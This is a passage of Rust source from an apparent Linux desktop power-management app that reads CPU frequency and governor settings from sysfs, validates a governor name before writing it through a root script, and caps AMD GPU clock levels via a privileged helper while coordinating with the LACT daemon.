use crate::power::arbiter::{self, Capability};
use crate::power::lact;
use crate::settings::{GpuCeilings, GpuPowerSource};
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Mutex;
use std::time::Duration;
use tauri::{AppHandle, Emitter};

#[derive(Debug, Serialize, Deserialize)]
pub struct CpuInfo {
    pub governor: String,
    pub min_freq: u32,
    pub max_freq: u32,
    pub current_freq: u32,
    pub available_governors: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct PowerProfile {
    pub current: String,
    pub available: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ApiResponse<T> {
    pub success: bool,
    pub data: Option<T>,
    pub error: Option<String>,
}

#[tauri::command]
pub fn get_cpu_info() -> ApiResponse<CpuInfo> {
    let cpu0_path = "/sys/devices/system/cpu/cpu0/cpufreq";

    let read_file = |file: &str| -> String {
        fs::read_to_string(format!("{}/{}", cpu0_path, file))
            .unwrap_or_default()
            .trim()
            .to_string()
    };

    let read_freq = |file: &str| -> u32 {
        read_file(file).parse::<u32>().unwrap_or(0) / 1000 // Convert kHz to MHz
    };

    let governor = read_file("scaling_governor");
    let available_governors = read_file("scaling_available_governors")
        .split_whitespace()
        .map(String::from)
        .collect();

    ApiResponse {
        success: true,
        data: Some(CpuInfo {
            governor,
            min_freq: read_freq("scaling_min_freq"),
            max_freq: read_freq("scaling_max_freq"),
            current_freq: read_freq("scaling_cur_freq"),
            available_governors,
        }),
        error: None,
    }
}

/// Governors the kernel reports as available on this machine.
fn read_available_governors() -> Vec<String> {
    fs::read_to_string("/sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors")
        .unwrap_or_default()
        .split_whitespace()
        .map(String::from)
        .collect()
}

/// Validate a governor name before it is interpolated into a script run as root.
///
/// Two independent layers: the name must be a plain lowercase identifier, AND the
/// kernel must list it as available. The character whitelist is the load-bearing
/// one — it holds even when sysfs can't be read, so an empty available-list can
/// never widen what is accepted.
fn validate_governor(governor: &str) -> Result<(), String> {
    if governor.is_empty() || governor.len() > 32 {
        return Err("Invalid governor name.".to_string());
    }
    if !governor.chars().all(|c| c.is_ascii_lowercase() || c == '_') {
        return Err(
            "Invalid governor name: only lowercase letters and underscores are allowed."
                .to_string(),
        );
    }

    let available = read_available_governors();
    if !available.is_empty() && !available.iter().any(|g| g == governor) {
        return Err(format!(
            "Governor '{}' is not available on this system. Available: {}",
            governor,
            available.join(", ")
        ));
    }
    Ok(())
}

/// Where the per-CPU governor files live. A glob, not a count, so it is the
/// root shell that decides which CPUs exist — see [`governor_script`].
const CPU_GLOB: &str = "/sys/devices/system/cpu/cpu[0-9]*/cpufreq/scaling_governor";

/// Build the script that applies `governor` to every CPU exposing a governor file.
///
/// The previous version counted `cpuN` directories and emitted one fixed
/// redirect per index under `set -e`. That broke in two ways: the count includes
/// CPUs that are present but OFFLINE, whose `cpufreq/` directory the kernel
/// removes, and it assumes contiguous numbering. Offlining a core — disabling
/// SMT, say — made that index's redirect fail with ENOENT, `set -e` aborted, and
/// pkexec returned non-zero *after* the earlier cores had already been changed.
/// The machine was left with mixed governors while the UI said nothing happened.
///
/// Globbing defers the decision to execution time, as root, so it sees whatever
/// CPUs are online at that moment. Only a total failure is an error: one core
/// going offline mid-run must not discard the ones that were set.
///
/// `governor` is validated against the kernel's own list before it gets here,
/// so interpolating it is safe.
fn governor_script(governor: &str, glob: &str) -> String {
    format!(
        r#"#!/bin/bash
set -u
applied=0
failed=0
for f in {glob}; do
  [ -e "$f" ] || continue
  if echo {governor} > "$f" 2>/dev/null; then
    applied=$((applied + 1))
  else
    failed=$((failed + 1))
    echo "could not write $f" >&2
  fi
done
echo "governor applied to $applied CPU(s), $failed refused"
if [ "$applied" -eq 0 ]; then
  echo "no CPU accepted the governor" >&2
  exit 1
fi
exit 0
"#
    )
}

#[tauri::command]
pub async fn set_cpu_governor(governor: String) -> ApiResponse<String> {
    println!("[Performance] Setting CPU governor to: {}", governor);

    // This value reaches a root shell below — validate before anything else.
    if let Err(e) = validate_governor(&governor) {
        println!("[Performance] ✗ Rejected governor: {}", e);
        return ApiResponse {
            success: false,
            data: None,
            error: Some(e),
        };
    }

    let script_content = governor_script(&governor, CPU_GLOB);

    run_privileged_write(
        &script_content,
        format!("CPU governor set to: {}", governor),
    )
    .await
}

// ---------------------------------------------------------------------------
// Clock limits — the frequencies the slider may stop at, and the GPU levels
// ---------------------------------------------------------------------------

/// The profile ids this app knows, and the only ids `set_power_profile` accepts.
/// Keeping them here means the switch the operator sees and the ids the daemon
/// reports cannot drift apart.
pub const POWER_PROFILES: [&str; 3] = ["power-saver", "balanced", "performance"];

pub fn is_known_profile(profile: &str) -> bool {
    POWER_PROFILES.contains(&profile)
}

/// The profile id that means the power-saver column of the GPU control.
///
/// One of [`POWER_PROFILES`], and the id TLP reports from `TLP_PROFILE_BAT=SAV`
/// on this machine. Nothing else tells the power-saver column from the plain
/// on-battery one: both are "not on mains".
const SAVER_PROFILE: &str = "power-saver";

/// Which power source the GPU ceiling applies for, from the two inputs that
/// decide it.
///
/// Mains wins, because the source is what the machine is plugged into and the
/// profile is only a mode it is in: power saver selected while charging is still
/// the AC column. Off mains, the profile is the only thing that separates the two
/// columns, and it is the profile this app already follows — the one
/// [`get_power_profile`] reads over D-Bus and [`power_profile_watcher`] keeps in
/// the settings store. There is no second source of truth to consult.
///
/// The battery column is the fallback rather than the saver one because the
/// profile is what the operator chose: an unknown or absent profile means "the
/// machine is on battery" and nothing more.
fn gpu_source(ac_online: bool, power_profile: &str) -> GpuPowerSource {
    if ac_online {
        GpuPowerSource::Ac
    } else if power_profile == SAVER_PROFILE {
        GpuPowerSource::Sav
    } else {
        GpuPowerSource::Bat
    }
}

/// Where the CPU's clock bounds live. `cpuinfo_*` is the hardware's own range,
/// `scaling_*` is what the kernel currently allows inside it.
const CPU_FREQ_DIR: &str = "/sys/devices/system/cpu/cpu0/cpufreq";

/// The clock range the CPU itself reports, in kHz.
///
/// `cpuinfo_min_freq`/`cpuinfo_max_freq` are the slider's ends rather than
/// `scaling_*`, because `scaling_*` already includes the last ceiling that was
/// applied: measuring a new cap against it would let one cap quietly ratchet the
/// next one down.
pub fn cpu_freq_bounds_khz() -> Option<(u64, u64)> {
    let read = |file: &str| -> Option<u64> {
        fs::read_to_string(format!("{}/{}", CPU_FREQ_DIR, file))
            .ok()?
            .trim()
            .parse::<u64>()
            .ok()
    };

    let min = read("cpuinfo_min_freq").or_else(|| read("scaling_min_freq"))?;
    let max = read("cpuinfo_max_freq").or_else(|| read("scaling_max_freq"))?;
    if min == 0 || max <= min {
        return None;
    }
    Some((min, max))
}

/// Every cpufreq policy's directory. One per cluster, so a machine can publish
/// more than one rule set; the ladder takes the union of what they offer.
const CPUFREQ_POLICY_DIR: &str = "/sys/devices/system/cpu/cpufreq";

/// The step a person reasons in when the kernel publishes no discrete P-state
/// list: 100 MHz stops, the granularity a frequency is read off a spec sheet in.
const LADDER_STEP_KHZ: u64 = 100_000;

/// How the ladder was obtained, reported by `CpuFrequencyLadder::source`.
const LADDER_SOURCE_KERNEL: &str = "kernel";
const LADDER_SOURCE_SYNTHESISED: &str = "synthesised";

/// The per-policy inputs the frequency ladder is built from, read in a single
/// pass over the policy directories.
///
/// Returns each policy's `scaling_available_frequencies` (absent on drivers that
/// publish no discrete P-state list, which is `amd-pstate`'s case) and the first
/// `lowest_nonlinear_freq` found, where the frequency/voltage curve stops being
/// linear.
fn read_policy_frequency_inputs() -> (Vec<Vec<u64>>, Option<u64>) {
    let Ok(entries) = fs::read_dir(CPUFREQ_POLICY_DIR) else {
        return (Vec::new(), None);
    };

    let mut dirs: Vec<PathBuf> = entries
        .filter_map(|entry| entry.ok())
        .map(|entry| entry.path())
        .filter(|path| {
            path.file_name()
                .and_then(|name| name.to_str())
                .is_some_and(|name| name.starts_with("policy"))
        })
        .collect();
    dirs.sort();

    let mut lists = Vec::new();
    let mut lowest_nonlinear_khz = None;
    for dir in dirs {
        if let Ok(raw) = fs::read_to_string(dir.join("scaling_available_frequencies")) {
            let frequencies: Vec<u64> = raw
                .split_whitespace()
                .filter_map(|token| token.parse::<u64>().ok())
                .collect();
            if !frequencies.is_empty() {
                lists.push(frequencies);
            }
        }
        if lowest_nonlinear_khz.is_none() {
            lowest_nonlinear_khz = fs::read_to_string(dir.join("amd_pstate_lowest_nonlinear_freq"))
                .ok()
                .and_then(|raw| raw.trim().parse::<u64>().ok());
        }
    }

    (lists, lowest_nonlinear_khz)
}

/// Build the frequencies the Clock Limits slider may stop at.
///
/// The kernel does not reject arbitrary values: cpufreq clamps them into the
/// hardware range and the driver rounds them to something it can drive. What the
/// slider must not do is offer stops that mean nothing to this CPU — so the list
/// is the machine's own vocabulary. When the kernel publishes
/// `scaling_available_frequencies` those entries are used verbatim; when it does
/// not (as here, under `amd-pstate`), the range is walked in `LADDER_STEP_KHZ`
/// steps instead.
///
/// The exact hardware `min_khz` and `max_khz` are always in the list. The top
/// one is how "no limit" is expressed, and rounding either end away would make
/// the maximum unreachable — the bug `step="any"` used to paper over.
pub fn build_ladder(
    per_policy_lists: &[Vec<u64>],
    min_khz: u64,
    max_khz: u64,
    lowest_nonlinear_khz: Option<u64>,
) -> CpuFrequencyLadder {
    let kernel_union: Vec<u64> = {
        let mut union: Vec<u64> = per_policy_lists.iter().flatten().copied().collect();
        union.sort_unstable();
        union.dedup();
        union
    };

    let (frequencies, source) = if kernel_union.is_empty() {
        (
            synthesise_ladder(min_khz, max_khz),
            LADDER_SOURCE_SYNTHESISED.to_string(),
        )
    } else {
        (kernel_union, LADDER_SOURCE_KERNEL.to_string())
    };

    CpuFrequencyLadder {
        frequencies,
        source,
        min_khz,
        max_khz,
        lowest_nonlinear_khz,
    }
}

/// Walk the hardware range in round steps, keeping both exact ends.
///
/// A range with no usable bounds (an absent cpufreq node reports 0/0) yields no
/// stops at all, so the UI can hide the slider instead of offering "0".
fn synthesise_ladder(min_khz: u64, max_khz: u64) -> Vec<u64> {
    if min_khz == 0 || max_khz < min_khz {
        return Vec::new();
    }

    let lo = min_khz.div_ceil(LADDER_STEP_KHZ) * LADDER_STEP_KHZ;
    let hi = max_khz / LADDER_STEP_KHZ * LADDER_STEP_KHZ;

    let mut frequencies = Vec::new();
    frequencies.push(min_khz);
    let mut frequency = lo;
    while frequency <= hi {
        frequencies.push(frequency);
        match frequency.checked_add(LADDER_STEP_KHZ) {
            Some(next) => frequency = next,
            None => break,
        }
    }
    frequencies.push(max_khz);

    frequencies.sort_unstable();
    frequencies.dedup();
    frequencies
}

/// One GPU clock level, as `pp_dpm_sclk` reports it.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GpuClockLevel {
    pub level: u32,
    pub freq_mhz: u32,
    /// The level the kernel marks with `*`: the one in force right now.
    pub active: bool,
}

/// The frequencies the Clock Limits slider may stop at.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CpuFrequencyLadder {
    /// Every selectable frequency in kHz, ascending, deduped. Verbatim from the
    /// kernel when it publishes a list, otherwise synthesised from the range.
    pub frequencies: Vec<u64>,
    /// "kernel" — came from scaling_available_frequencies.
    /// "synthesised" — the kernel publishes no list, so it was built from the
    ///   hardware range.
    pub source: String,
    /// The hardware range the list spans.
    pub min_khz: u64,
    pub max_khz: u64,
    /// Below this the CPU runs in its linear region, where frequency scaling is
    /// voltage-inefficient. amd_pstate's lowest_nonlinear_freq. None when the
    /// kernel does not publish one.
    pub lowest_nonlinear_khz: Option<u64>,
}

/// Everything the Clock Limits card needs to draw itself.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClockLimits {
    pub cpu_hw_min_khz: u64,
    pub cpu_hw_max_khz: u64,
    pub cpu_scaling_min_khz: u64,
    pub cpu_scaling_max_khz: u64,
    /// The stops the frequency slider may land on, and where they came from.
    pub cpu_frequencies: CpuFrequencyLadder,
    /// The levels the card offers, each carrying its own `active` flag: the one
    /// the kernel marks with `*` is the level in force right now.
    pub gpu_levels: Vec<GpuClockLevel>,
    /// False on machines with no usable amdgpu clock node — the UI then hides
    /// the GPU control instead of offering a knob that cannot do anything.
    pub gpu_found: bool,
    /// The ceilings this app holds, one per power source. What each column of
    /// the control shows, because it is what the app enforces: the live level is
    /// only where the driver happens to be.
    pub gpu_held_levels: GpuCeilings,
    /// The power source in force right now. The view marks that column with it
    /// rather than working it out from the levels, which cannot tell the battery
    /// and saver columns apart.
    pub gpu_source: GpuPowerSource,
    /// Who is writing `power_dpm_force_performance_level` right now.
    pub gpu_owner: GpuOwner,
}

/// Who is writing the GPU's performance level right now.
///
/// The GPU is the one knob where the app can end a conflict instead of only
/// reporting it: [`crate::power::lact`] asks lactd to let go of the device
/// before a ceiling is written. Which of those has happened is not visible in
/// sysfs — the node reads the same either way — so it is reported explicitly,
/// for the view to say out loud rather than guess.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum GpuOwner {
    /// No lactd socket: nothing but this app writes this level.
    Uncontested,
    /// lactd is holding this GPU and applies its own level to it, so a ceiling
    /// written here would be reverted on lactd's next tick.
    Lact,
    /// lactd is running but has been told to let go of this GPU: the level
    /// written here is the one that holds, until it is handed back.
    #[serde(rename = "thinkpro")]
    ThinkPro,
    /// lactd's socket is there but it did not answer, so which of the two writes
    /// the level next cannot be known from here.
    Unknown,
}

/// The GPU's `pp_dpm_sclk` node.
///
/// The iGPU is not always `card0`: with a discrete card installed, or when the
/// numbering shifts between boots, `card0` can be the other device. So the cards
/// are read out of `/sys/class/drm` and the first one that actually exposes a
/// clock-level file wins, instead of guessing an index.
pub fn gpu_sclk_path() -> Option<PathBuf> {
    let mut found: Vec<PathBuf> = fs::read_dir("/sys/class/drm")
        .ok()?
        .filter_map(|entry| entry.ok())
        .map(|entry| entry.path().join("device/pp_dpm_sclk"))
        .filter(|path| path.exists())
        .collect();
    found.sort();
    found.into_iter().next()
}

/// The node that has to read `manual` before amdgpu accepts a new level list.
fn gpu_force_level_path(sclk: &Path) -> Option<PathBuf> {
    let path = sclk.parent()?.join("power_dpm_force_performance_level");
    path.exists().then_some(path)
}

/// The id LACT knows this GPU by, built from sysfs the same way its own
/// `list_devices` does: `vendor:device-subvendor:subdevice-pci-slot`.
///
/// Rebuilding it rather than remembering it matters for the hand-back: once the
/// GPU is detached, lactd's device list is empty and there is no id left to look
/// up, so the only thing that can name the device is the hardware itself.
fn lact_device_id(sclk: &Path) -> Option<String> {
    let device = sclk.parent()?;
    let read = |file: &str| -> Option<String> {
        fs::read_to_string(device.join(file))
            .ok()
            .map(|raw| raw.trim().trim_start_matches("0x").to_string())
    };

    // `/sys/class/drm/cardN/device` is a symlink into the PCI tree, and its own
    // name is the slot every id ends with.
    let slot = fs::canonicalize(device).ok()?;
    let slot = slot.file_name()?.to_str()?.to_string();

    Some(format!(
        "{}:{}-{}:{}-{}",
        read("vendor")?.to_lowercase(),
        read("device")?.to_lowercase(),
        read("subsystem_vendor")?.to_uppercase(),
        read("subsystem_device")?.to_uppercase(),
        slot
    ))
}

/// Whether two LACT device ids name the same card.
///
/// The PCI slot is the part that identifies the device; the vendor and
/// subsystem fields in front of it are LACT's formatting, and a rename there
/// must not make the app believe it owns a GPU lactd is still managing.
fn same_pci_slot(left: &str, right: &str) -> bool {
    match (left.rsplit_once('-'), right.rsplit_once('-')) {
        (Some((_, left)), Some((_, right))) => left == right,
        _ => left == right,
    }
}

/// The rule itself, over what lactd listed: a card it manages is a card it
/// writes, and a card missing from the list is one it has been told to leave.
fn owner_from_listing(devices: &[String], id: &str) -> GpuOwner {
    if devices.iter().any(|known| same_pci_slot(known, id)) {
        GpuOwner::Lact
    } else {
        GpuOwner::ThinkPro
    }
}

/// Who is writing the GPU's level, asked of lactd directly.
fn gpu_owner(sclk: Option<&Path>) -> GpuOwner {
    let Some(client) = lact::Client::detect() else {
        return GpuOwner::Uncontested;
    };
    let Some(id) = sclk.and_then(lact_device_id) else {
        return GpuOwner::Unknown;
    };

    match client.gpu_ids() {
        Ok(ids) => owner_from_listing(&ids, &id),
        Err(_) => GpuOwner::Unknown,
    }
}

/// Ask lactd to stop managing this GPU, so a level written here is the one that
/// stays.
///
/// `Ok(true)` means the device was detached and belongs to this app until it is
/// handed back; `Ok(false)` means LACT was not in the way — not running, or
/// already detached. An `Err` means LACT is there, is holding the GPU, and would
/// not let go: the caller must not write, because lactd would revert it.
fn detach_from_lact(sclk: &Path) -> Result<bool, String> {
    let Some(client) = lact::Client::detect() else {
        return Ok(false);
    };
    let id = lact_device_id(sclk)
        .ok_or_else(|| "could not read this GPU's id from sysfs".to_string())?;

    let managed = match client.gpu_ids() {
        Ok(ids) => ids,
        // A socket with nothing behind it is a file left by a lactd that is
        // gone. Nothing will overwrite the write, so it must not block one.
        Err(lact::Error::Unreachable(_)) => return Ok(false),
        Err(lact::Error::Refused(message)) => {
            return Err(format!(
                "LACT is running but would not list its GPUs: {message}"
            ))
        }
    };

    // Prefer the id lactd itself answered with, and fall back to the one built
    // from sysfs only when the card is absent from the list — which is the
    // already-detached case, where there is nothing left to detach.
    let Some(managed) = managed
        .iter()
        .find(|known| same_pci_slot(known, &id))
        .cloned()
    else {
        return Ok(false);
    };

    client
        .detach(&managed)
        .map_err(|error| format!("LACT would not let go of this GPU: {error}"))?;
    Ok(true)
}

/// Give this GPU back to lactd, if it is running and has let go of it.
///
/// `Ok(true)` means lactd manages the card again; `Ok(false)` means there was
/// nothing to hand back — no lactd, or it never let go in the first place.
fn hand_back_to_lact(sclk: &Path) -> Result<bool, String> {
    let Some(client) = lact::Client::detect() else {
        return Ok(false);
    };
    let id = lact_device_id(sclk)
        .ok_or_else(|| "could not read this GPU's id from sysfs".to_string())?;

    let managed = match client.gpu_ids() {
        Ok(ids) => ids,
        Err(lact::Error::Unreachable(_)) => return Ok(false),
        Err(lact::Error::Refused(message)) => {
            return Err(format!(
                "LACT is running but would not list its GPUs: {message}"
            ))
        }
    };

    if managed.iter().any(|known| same_pci_slot(known, &id)) {
        return Ok(false);
    }

    client
        .reattach(&id)
        .map_err(|error| format!("LACT would not take this GPU back: {error}"))?;
    Ok(true)
}

/// Parse `pp_dpm_sclk`: one `index: freqMhz [*]` line per level.
///
/// Lines that do not parse are skipped rather than fatal. Older AMD designs print
/// a deep-sleep level as `S: 19Mhz *`, and one unrecognised line must not empty
/// the whole list and make the UI claim the machine has no GPU clocks.
fn parse_sclk_levels(content: &str) -> Vec<GpuClockLevel> {
    content
        .lines()
        .filter_map(|line| {
            let line = line.trim();
            let active = line.ends_with('*');
            let body = line.trim_end_matches('*').trim();
            let (index, freq) = body.split_once(':')?;
            let level = index.trim().parse::<u32>().ok()?;
            let freq_mhz = freq
                .trim()
                .trim_end_matches(|c: char| c.is_ascii_alphabetic())
                .trim()
                .parse::<u32>()
                .ok()?;
            Some(GpuClockLevel {
                level,
                freq_mhz,
                active,
            })
        })
        .collect()
}

/// The GPU clock node and the levels it offers, or `None` when this machine has
/// no usable amdgpu clock interface.
pub fn gpu_sclk_and_levels() -> Option<(PathBuf, Vec<GpuClockLevel>)> {
    let path = gpu_sclk_path()?;
    let levels = parse_sclk_levels(&fs::read_to_string(&path).ok()?);
    if levels.is_empty() {
        return None;
    }
    Some((path, levels))
}

/// The levels to leave enabled for a ceiling at `cap_level`.
///
/// amdgpu reads a write to `pp_dpm_sclk` as the *set* of levels the GPU may use:
/// `echo "4 5 6" > pp_dpm_sclk` leaves only those three enabled
/// (Documentation/gpu/amdgpu/thermal.rst). A ceiling is therefore every level up
/// to and including the cap. Writing the cap index alone would pin the GPU to
/// that single clock and take the idle level away with it, which spends battery
/// instead of saving it.
fn levels_up_to(levels: &[GpuClockLevel], cap_level: u32) -> Option<Vec<u32>> {
    if !levels.iter().any(|l| l.level == cap_level) {
        return None;
    }
    let mut enabled: Vec<u32> = levels
        .iter()
        .filter(|l| l.level <= cap_level)
        .map(|l| l.level)
        .collect();
    enabled.sort_unstable();
    Some(enabled)
}

/// The helper verb that puts `cap` in force.
///
/// The level is an index into the card's own table -- never a path, and never a
/// shell word. The helper re-reads that table and refuses anything it does not
/// list, so this is a request the privileged side is free to turn down. `None` is
/// the form that takes no argument and hands every level back.
///
/// `auto` is the kernel's own control, so a forced mode another tool had set
/// (`low`, `high`, a `profile_*` heuristic) is not restored -- nothing here has
/// recorded it. Keep that in mind before treating Uncap as a full undo.
fn gpu_verb_args(cap: Option<u32>) -> Vec<String> {
    match cap {
        Some(level) => vec!["gpu-clock-cap".to_string(), level.to_string()],
        None => vec!["gpu-clock-auto".to_string()],
    }
}

/// The contract every privileged write has: stdout and stderr are logged, a
/// non-zero exit becomes the message the operator sees, and a command that could
/// not be launched is reported as that rather than as a failed write.
fn privileged_response(
    result: Result<std::process::Output, String>,
    success_message: String,
) -> ApiResponse<String> {
    match result {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);

            println!("[Performance] stdout: {}", stdout);
            println!("[Performance] stderr: {}", stderr);
            println!("[Performance] status: {}", output.status);

            if output.status.success() {
                println!("[Performance] {}", success_message);
                ApiResponse {
                    success: true,
                    data: Some(success_message),
                    error: None,
                }
            } else {
                let error_msg = if stderr.trim().is_empty() {
                    "Permission denied or operation failed".to_string()
                } else {
                    stderr.trim().to_string()
                };
                println!("[Performance] Failed: {}", error_msg);
                ApiResponse {
                    success: false,
                    data: None,
                    error: Some(error_msg),
                }
            }
        }
        Err(e) => {
            println!("[Performance] Failed to launch: {}", e);
            ApiResponse {
                success: false,
                data: None,
                error: Some(e),
            }
        }
    }
}

/// Write through generated bash under pkexec.
///
/// Still the path the CPU governor takes, because its write spans every CPU on
/// the machine and has no single fixed command to whitelist. Nothing new should
/// join it: the helper is the passwordless route, and the polkit rule grants
/// only the helper.
async fn run_privileged_write(script: &str, success_message: String) -> ApiResponse<String> {
    println!("[Performance] Script content: {}", script);
    println!("[Performance] Executing pkexec...");

    privileged_response(crate::privileged::run_script(script).await, success_message)
}

/// The helper's own answer when it does not know the verb at all. A helper
/// installed by an older build says this, and it is worth naming as the version
/// skew it is rather than letting it read as a bad request from this app.
const HELPER_UNKNOWN_COMMAND: &str = "Invalid command";

/// Run one verb of the installed helper.
///
/// Unlike [`run_privileged_write`] this needs no authentication: the polkit rule
/// matches the helper's path, so an allowlisted verb runs as root silently. That
/// is what makes the GPU ceiling work in the first place -- a watcher re-assert
/// cannot answer a password dialog.
async fn run_helper_verb(args: &[String], success_message: String) -> ApiResponse<String> {
    let argv: Vec<&str> = args.iter().map(String::as_str).collect();
    println!("[Performance] Helper command: {}", argv.join(" "));

    let response = privileged_response(crate::privileged::run_helper(&argv).await, success_message);

    let stale_helper = !response.success
        && response
            .error
            .as_deref()
            .is_some_and(|error| error.contains(HELPER_UNKNOWN_COMMAND));
    if stale_helper {
        let installed = crate::fan_control::helper_path().unwrap_or("the privileged helper");
        return ApiResponse {
            success: false,
            data: None,
            error: Some(format!(
                "the helper installed at {installed} does not know this command, so it predates this build of the app; reinstall the package, or run Grant Permissions again to rewrite the copy this app owns"
            )),
        };
    }

    response
}

/// `ApiResponse` in, `Result` out, so a multi-step apply can stop at the write
/// that failed and name it.
fn as_result(response: ApiResponse<String>) -> Result<String, String> {
    if response.success {
        Ok(response.data.unwrap_or_default())
    } else {
        Err(response
            .error
            .unwrap_or_else(|| "Unknown error".to_string()))
    }
}

fn ok<T>(data: T) -> ApiResponse<T> {
    ApiResponse {
        success: true,
        data: Some(data),
        error: None,
    }
}

fn failure<T>(message: String) -> ApiResponse<T> {
    ApiResponse {
        success: false,
        data: None,
        error: Some(message),
    }
}

/// Cap the GPU at `cap`, or remove any cap with `None`.
///
/// The file is read back afterwards: the kernel is the only authority on which
/// levels ended up in force, and a write that quietly did nothing must not be
/// reported as success.
async fn write_gpu_clock_cap(
    sclk: &Path,
    levels: &[GpuClockLevel],
    cap: Option<u32>,
) -> Result<String, String> {
    // Held for the length of this call, which is what tells the watcher not to
    // write a level the operator is in the middle of replacing.
    let _in_flight = GpuWriteInFlight::begin();

    // Which levels a cap enables is the helper's answer, from the card's own
    // table at the moment it writes, so nothing here builds a level list. This
    // check is what keeps a level the card does not have from reaching the
    // detach below -- the helper would refuse it too, but only after LACT had
    // already been told to let go of the GPU.
    if let Some(level) = cap {
        if levels_up_to(levels, level).is_none() {
            return Err(format!("This GPU has no clock level {}", level));
        }
    }

    // Whoever else is writing this node has to let go first. On a machine with
    // lactd the level set here is otherwise reverted the next time it applies
    // its own, and a success message for that would be a lie. This happens
    // before the write is issued so a refusal never reaches root at all.
    let detached = detach_from_lact(sclk)?;
    let message = match cap {
        Some(level) => {
            let freq_mhz = levels
                .iter()
                .find(|l| l.level == level)
                .map(|l| l.freq_mhz)
                .unwrap_or(0);
            format!("GPU clock capped at level {} ({} MHz)", level, freq_mhz)
        }
        None => "GPU clock ceiling removed; every level is available again".to_string(),
    };

    let applied = match as_result(run_helper_verb(&gpu_verb_args(cap), message).await) {
        Ok(applied) => applied,
        Err(error) => {
            // The write never happened, so there is no claim for LACT to fight
            // over. Hand the GPU back before reporting the failure: leaving it
            // detached would strand it with nothing managing it at all, which
            // is a worse state than the one this call was asked to create.
            if detached {
                if let Err(hand_back) = hand_back_to_lact(sclk) {
                    return Err(format!(
                        "{error} The GPU was left detached from LACT, and handing it back failed too: {hand_back}"
                    ));
                }
            }
            return Err(error);
        }
    };
    let applied = if detached {
        format!("{applied}; LACT has been told to leave this GPU alone")
    } else {
        applied
    };

    Ok(match gpu_sclk_and_levels() {
        Some((_, now)) => match now.iter().find(|l| l.active) {
            Some(active) => format!(
                "{}; the kernel now reports level {} ({} MHz) in force",
                applied, active.level, active.freq_mhz
            ),
            None => applied,
        },
        None => applied,
    })
}

/// Whether a level list was forced on the GPU: `manual` is the only mode a
/// `pp_dpm_sclk` write holds in.
///
/// Everything that takes the card back — `lactd` re-applying its config on a
/// restart, a driver reload, a resume — replaces `manual` with `low`, `high` or
/// `auto`, and that is the drift the ceiling watcher looks for.
fn gpu_force_reads_manual(sclk: &Path) -> bool {
    gpu_force_level_path(sclk)
        .map(|force| matches!(fs::read_to_string(&force), Ok(value) if value.trim() == "manual"))
        .unwrap_or(false)
}

/// Whether the GPU is still being held at `cap`.
///
/// `power_dpm_force_performance_level` is the whole answer, and that is a
/// deliberate choice rather than a shortcut: the level list is not readable
/// evidence. `pp_dpm_sclk` prints every level the part offers whether the write
/// restricted them or not — verified on this GPU, where a cap at level 1 and
/// LACT's own `low` both print all three — and the kernel publishes no second
/// file saying which of them the write left enabled. What it does publish is the
/// forced mode, and `manual` is the only one a level-list write holds in.
///
/// The cap has to be a level this GPU still offers, or there is no ceiling here
/// for the hardware to be honouring.
fn gpu_cap_in_force(sclk: &Path, cap: u32) -> bool {
    if !gpu_force_reads_manual(sclk) {
        return false;
    }

    let levels = fs::read_to_string(sclk)
        .map(|table| parse_sclk_levels(&table))
        .unwrap_or_default();
    levels_up_to(&levels, cap).is_some()
}

/// The ceiling this app last wrote to the GPU, and the source it wrote it for.
///
/// The one thing a pass needs that nothing else can supply.
/// `power_dpm_force_performance_level` reads `manual` for *any* level-list write,
/// so a ceiling of 0 and a ceiling of 2 look identical there, and `pp_dpm_sclk`
/// prints the same levels either way. Without this record a machine moving from
/// mains (ceiling 2) to battery (ceiling 0) would look like a ceiling already in
/// force and keep 2 — the exact thing the per-source ceilings exist to prevent.
///
/// Process-local on purpose. What is remembered is not the ceiling — the settings
/// store holds that — but which source's write is on the card right now. A
/// restart loses it, and the next pass writes the ceiling for the source in
/// force, which is the same write the record was only saving; the one state it
/// cannot reconstruct is a column left empty, and the ceiling that column
/// replaces stays on the card until the next LACT restart or a new choice.
static GPU_LAST_CEILING: Mutex<Option<(GpuPowerSource, u32)>> = Mutex::new(None);

fn gpu_last_ceiling() -> Option<(GpuPowerSource, u32)> {
    GPU_LAST_CEILING.lock().map(|held| *held).unwrap_or(None)
}

fn remember_gpu_ceiling(ceiling: Option<(GpuPowerSource, u32)>) {
    if let Ok(mut held) = GPU_LAST_CEILING.lock() {
        *held = ceiling;
    }
}

/// Whether the ceiling held for `source` is the one on the GPU right now.
///
/// Both halves are needed. [`gpu_cap_in_force`] answers whether the card is
/// still in the mode a level-list write leaves behind — `manual`, at a level
/// this GPU offers — and the record answers *which* of the app's writes it is,
/// since the mode alone cannot tell a ceiling of 0 from a ceiling of 2. A source
/// change and a LACT revert are the same answer here: the level in force is not
/// the level wanted, so the pass writes.
fn gpu_ceiling_holds(
    sclk: &Path,
    last: Option<(GpuPowerSource, u32)>,
    source: GpuPowerSource,
    level: u32,
) -> bool {
    last == Some((source, level)) && gpu_cap_in_force(sclk, level)
}

/// Whether a ceiling this app wrote is still on the card for a source that is no
/// longer in force.
///
/// Only the record can answer it, and answering it from the record is what keeps
/// the release honest: it is `Some` only after a write this app made and that
/// succeeded, so a release can never take a card from another writer. A restart
/// has no record, and the pass then only writes the ceiling the source in force
/// asks for; the one state that leaves unrepaired is a column deliberately left
/// empty while a ceiling written for another source is still on the card, and
/// that ceiling stays until LACT next takes the card or a source holds one
/// again.
fn gpu_release_needed(last: Option<(GpuPowerSource, u32)>, source: GpuPowerSource) -> bool {
    matches!(last, Some((held, _)) if held != source)
}

/// How many GPU clock changes are in flight.
///
/// Counted rather than flagged because the view and the watcher are separate
/// tasks that can each be inside one.
static GPU_WRITES_IN_FLIGHT: AtomicUsize = AtomicUsize::new(0);

/// One GPU clock change, marked as running until this is dropped.
///
/// It covers everything between the GPU changing state and the settings store
/// agreeing with it — a write or a hand-back, plus the store write that records
